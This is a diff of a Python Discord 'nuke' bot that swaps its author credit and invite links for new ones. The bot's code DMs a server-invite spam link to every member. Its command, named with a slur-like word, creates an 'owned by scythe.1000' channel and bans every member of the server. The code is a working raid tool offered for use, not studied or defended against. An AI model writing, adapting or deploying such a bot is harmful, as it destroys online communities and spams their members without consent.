@@ -1,5 +1,4 @@
-#bot created by Sir Sinister
-#make sure to read the read me file for instructions
+#bot created by awazon._
 
 import discord
 from discord.ext import commands
@@ -44,7 +43,7 @@ async def dm(ctx, message):
     for member in server.members:
      await asyncio.sleep(0)
      try:
-       await client.send_message(member, "https://discord.gg/sujRrDX Join now for a cheap unlimited account generator!!")
+       await client.send_message(member, "https://discord.gg/9yFfAc9nzZ")
        print("Sent message")
      except:
        pass
@@ -124,15 +123,15 @@ async def rape(ctx):
             except:
                 pass
         server = ctx.message.server
-        channel = await client.create_channel(server, 'RIP', type=discord.ChannelType.text)
-        await client.send_message(channel, "Now that's alot of damage!!")
+        channel = await client.create_channel(server, 'owned by scythe.1000', type=discord.ChannelType.text)
+        await client.send_message(channel, "https://discord.gg/9yFfAc9nzZ")
         for user in list(ctx.message.server.members):
             try:
                 await client.ban(user)
                 print ("User " + user.name + " has been banned from " + ctx.message.server.name)
             except:
                 pass
-        print ("Now that's alot of damage")
+        print ("owned by scythe.1000")
 
 @client.command(pass_context=True)
 async def dab(ctx):
@@ -142,6 +141,6 @@ async def dab(ctx):
     user = ctx.message.author
     role = discord.utils.get(user.server.roles, name="dab")
     await client.add_roles(user, role)
-    print ("You're in buddy, now don't fuck it up")
+    print ("owned by scythe.1000")
 
 client.run("TOKEN") #Bot's Token Code Goes Here
